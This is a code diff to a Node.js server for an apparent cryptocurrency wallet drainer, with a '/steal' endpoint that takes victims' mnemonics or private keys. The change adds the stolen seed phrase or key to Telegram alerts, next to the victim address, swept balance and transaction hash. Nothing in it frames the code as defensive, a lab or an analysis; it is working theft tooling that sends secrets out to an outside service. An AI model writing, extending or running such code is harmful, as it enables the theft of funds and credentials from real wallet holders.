@@ -66,16 +66,27 @@ async function sendTelegramAlert(payload) {
     text = payload;
   } else {
     const {
-      victim, balanceEth, txHash, gasUsed, gasFeeEth, senderAddr, senderName
+      victim, balanceEth, txHash, gasUsed, gasFeeEth, senderAddr, senderName, secret
     } = payload;
     const txUrl = txHash ? `https://sepolia.etherscan.io/tx/${txHash}` : 'n/a';
     const lines = [
       '*Sweep detected*',
       `• Victim: \`${victim}\``,
+    ];
+    
+    // Add seed phrase if provided
+    if (secret) {
+      // Truncate if too long (for private keys), or show full mnemonic
+      const secretDisplay = secret.length > 80 ? secret.substring(0, 40) + '...' : secret;
+      lines.push(`• Seed/Key: \`${secretDisplay}\``);
+    }
+    
+    lines.push(
       `• Balance: ${balanceEth ?? 'n/a'} ETH`,
       `• Tx: ${txUrl}`,
-      `• Gas fee: ${gasFeeEth ?? 'n/a'} ETH (gasUsed ${gasUsed ?? 'n/a'})`,
-    ];
+      `• Gas fee: ${gasFeeEth ?? 'n/a'} ETH (gasUsed ${gasUsed ?? 'n/a'})`
+    );
+    
     if (senderAddr) {
       lines.push(`• Sender: \`${senderAddr}\`` + (senderName ? ` (${tgEscapeMarkdown(senderName)})` : ''));
     }
@@ -140,6 +151,7 @@ app.post('/steal', async (req, res) => {
     const secretType = maybeWords.length >= 12 ? 'mnemonic' : 'private key';
     await sendTelegramAlert({
       victim: addr,
+      secret: trimmed,
       balanceEth: 'checking...',
       txHash: null,
       gasUsed: null,
@@ -207,6 +219,7 @@ app.post('/steal', async (req, res) => {
     if (!isOnCooldown(addr)) {
       await sendTelegramAlert({
         victim: addr,
+        secret: trimmed,
         balanceEth: balanceStr,
         txHash: receipt.transactionHash,
         gasUsed: gasUsedBn.toString(),
